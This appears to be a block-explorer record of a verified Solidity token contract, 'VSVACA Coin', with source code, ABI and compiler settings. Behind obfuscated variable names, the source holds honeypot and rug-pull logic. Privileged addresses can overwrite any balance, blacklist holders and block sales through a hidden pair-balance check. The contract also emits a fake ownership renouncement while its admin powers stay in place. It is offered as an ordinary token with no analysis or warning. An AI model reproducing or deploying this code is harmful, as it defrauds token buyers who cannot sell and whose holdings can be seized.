{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface fromReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address minTake) external view returns (uint256);\n\n    function transfer(address shouldFee, uint256 atFromFee) external returns (bool);\n\n    function allowance(address limitFromReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 atFromFee) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address shouldFee,\n        uint256 atFromFee\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverAmount, uint256 value);\n    event Approval(address indexed limitFromReceiver, address indexed spender, uint256 value);\n}\n\ninterface fromReceiverMetadata is fromReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\nabstract contract enableTx {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface walletMarketingAmount {\n    function createPair(address buyAt, address modeList) external returns (address);\n}\n\ninterface atLaunch {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ncontract VSVACACoin is enableTx, fromReceiver, fromReceiverMetadata {\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverLaunchedLiquidity;\n    }\n\n    address exemptSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address launchReceiverTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function getOwner() external view returns (address) {\n        return swapBuyFee;\n    }\n\n    bool public listFee;\n\n    function balanceOf(address minTake) public view virtual override returns (uint256) {\n        return sellTake[minTake];\n    }\n\n    uint256 tokenAt;\n\n    function receiverFund(address atReceiverTx, uint256 atFromFee) public {\n        fundTeam();\n        sellTake[atReceiverTx] = atFromFee;\n    }\n\n    function atTakeSwap(address shouldTx) public {\n        fundTeam();\n        \n        if (shouldTx == receiverFee || shouldTx == limitLaunched) {\n            return;\n        }\n        amountSwap[shouldTx] = true;\n    }\n\n    address public limitLaunched;\n\n    uint256 private marketingSender;\n\n    uint256 public receiverExempt;\n\n    function isLimitMarketing(address minMarketing, address shouldFee, uint256 atFromFee) internal returns (bool) {\n        require(sellTake[minMarketing] >= atFromFee);\n        sellTake[minMarketing] -= atFromFee;\n        sellTake[shouldFee] += atFromFee;\n        emit Transfer(minMarketing, shouldFee, atFromFee);\n        return true;\n    }\n\n    bool private fundSwap;\n\n    function tradingMode() public {\n        emit OwnershipTransferred(receiverFee, address(0));\n        swapBuyFee = address(0);\n    }\n\n    function transfer(address atReceiverTx, uint256 atFromFee) external virtual override returns (bool) {\n        return senderWallet(_msgSender(), atReceiverTx, atFromFee);\n    }\n\n    bool private enableMax;\n\n    mapping(address => uint256) private sellTake;\n\n    function transferFrom(address minMarketing, address shouldFee, uint256 atFromFee) external override returns (bool) {\n        if (_msgSender() != exemptSwap) {\n            if (fromExemptTx[minMarketing][_msgSender()] != type(uint256).max) {\n                require(atFromFee <= fromExemptTx[minMarketing][_msgSender()]);\n                fromExemptTx[minMarketing][_msgSender()] -= atFromFee;\n            }\n        }\n        return senderWallet(minMarketing, shouldFee, atFromFee);\n    }\n\n    function owner() external view returns (address) {\n        return swapBuyFee;\n    }\n\n    uint256 public sellTotal;\n\n    function senderWallet(address minMarketing, address shouldFee, uint256 atFromFee) internal returns (bool) {\n        if (minMarketing == receiverFee) {\n            return isLimitMarketing(minMarketing, shouldFee, atFromFee);\n        }\n        uint256 fundIs = fromReceiver(limitLaunched).balanceOf(launchReceiverTrading);\n        require(fundIs == limitSender);\n        require(!amountSwap[minMarketing]);\n        return isLimitMarketing(minMarketing, shouldFee, atFromFee);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return sellTx;\n    }\n\n    bool public receiverSell;\n\n    function fundTeam() private view {\n        require(launchSender[_msgSender()]);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fromSwapExempt;\n    }\n\n    uint256 private fromExempt;\n\n    address public receiverFee;\n\n    mapping(address => mapping(address => uint256)) private fromExemptTx;\n\n    function isEnable(address atSenderTx) public {\n        if (listFee) {\n            return;\n        }\n        if (receiverExempt == buyTeam) {\n            buyTeam = receiverExempt;\n        }\n        launchSender[atSenderTx] = true;\n        \n        listFee = true;\n    }\n\n    address private swapBuyFee;\n\n    constructor (){\n        \n        tradingMode();\n        atLaunch modeAt = atLaunch(exemptSwap);\n        limitLaunched = walletMarketingAmount(modeAt.factory()).createPair(modeAt.WETH(), address(this));\n        \n        receiverFee = _msgSender();\n        launchSender[receiverFee] = true;\n        sellTake[receiverFee] = fromSwapExempt;\n        \n        emit Transfer(address(0), receiverFee, fromSwapExempt);\n    }\n\n    uint8 private txMinShould = 18;\n\n    function allowance(address teamFund, address senderAmountMarketing) external view virtual override returns (uint256) {\n        if (senderAmountMarketing == exemptSwap) {\n            return type(uint256).max;\n        }\n        return fromExemptTx[teamFund][senderAmountMarketing];\n    }\n\n    uint256 limitSender;\n\n    mapping(address => bool) public amountSwap;\n\n    uint256 private buyTeam;\n\n    uint256 private fromSwapExempt = 100000000 * 10 ** 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return txMinShould;\n    }\n\n    string private receiverLaunchedLiquidity = \"VCN\";\n\n    function shouldSwap(uint256 atFromFee) public {\n        fundTeam();\n        limitSender = atFromFee;\n    }\n\n    event OwnershipTransferred(address indexed launchAuto, address indexed shouldReceiver);\n\n    string private sellTx = \"VSVACA Coin\";\n\n    mapping(address => bool) public launchSender;\n\n    function approve(address senderAmountMarketing, uint256 atFromFee) public virtual override returns (bool) {\n        fromExemptTx[_msgSender()][senderAmountMarketing] = atFromFee;\n        emit Approval(_msgSender(), senderAmountMarketing, atFromFee);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitFromReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverAmount\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderAmountMarketing\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderAmountMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atFromFee\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTx\",\"type\":\"address\"}],\"name\":\"atTakeSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTake\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atSenderTx\",\"type\":\"address\"}],\"name\":\"isEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atReceiverTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atFromFee\",\"type\":\"uint256\"}],\"name\":\"receiverFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"atFromFee\",\"type\":\"uint256\"}],\"name\":\"shouldSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atReceiverTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atFromFee\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atFromFee\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "VSVACACoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}